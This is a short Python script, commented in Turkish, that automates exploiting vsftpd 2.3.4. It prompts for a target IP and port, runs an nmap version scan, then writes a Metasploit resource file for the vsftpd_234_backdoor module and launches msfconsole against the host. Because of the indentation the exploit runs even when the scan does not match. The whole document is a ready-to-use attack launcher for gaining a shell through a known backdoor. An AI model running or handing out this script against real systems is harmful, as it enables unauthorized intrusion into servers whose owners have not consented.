# -*- coding: utf-8 -*-
import os
import pyfiglet
from colorama import Fore

t = pyfiglet.figlet_format("OTOMATİK EXPLOİT VSFTPD2.3.4")
print(Fore.GREEN+t)
ip = str(input(Fore.RED+"ip adresini giriniz: "))
port = int(input(Fore.RED+"port giriniz: "))
banner_liste = []
try:
    a = os.popen("nmap -p {} -sV {}".format(port,ip))
    file = a.read()
    banner_liste.append(file)
except:
    pass
for servis in banner_liste:
    if "vsftpd 2.3.4" in servis:
      print(Fore.RED+"bu servis exploit edilebilir.")
    rc_kod = """
        use exploit/unix/ftp/vsftpd_234_backdoor
        set RHOSTS ip_adresi
        exploit"""
    rc_son = rc_kod.replace("ip_adresi",str(ip))
    dosya = open("/root/Desktop/mustafa/active/vsftpd.rc","w")
    dosya.write(rc_son)
    dosya.close()
    os.system("xterm -e msfconsole -r /root/Desktop/mustafa/active/vsftpd.rc")
